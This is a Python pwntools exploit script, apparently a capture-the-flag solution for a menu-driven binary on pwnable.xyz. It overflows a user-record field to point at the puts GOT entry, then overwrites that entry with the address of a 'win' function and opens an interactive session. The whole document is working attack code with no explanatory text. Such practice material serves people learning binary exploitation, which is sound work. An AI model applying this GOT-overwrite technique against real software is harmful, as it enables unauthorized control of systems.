from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30011

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def create_usr(r, name, age):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Name: ", name)
    r.sendlineafter(b"Age: ", str(age).encode())

def edit_usr(r, name, age=b"67"):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Name: ", name)
    r.sendlineafter(b"Age: ", age)
    
def main():
    r  = conn()

    create_usr(r, b"A" * 31, 67)
    edit_usr(r, b"palle", b"A" * 16 + pack(exe.got.puts))
    edit_usr(r, pack(exe.symbols.win))
    
    r.interactive()

if __name__ == "__main__":
    main()
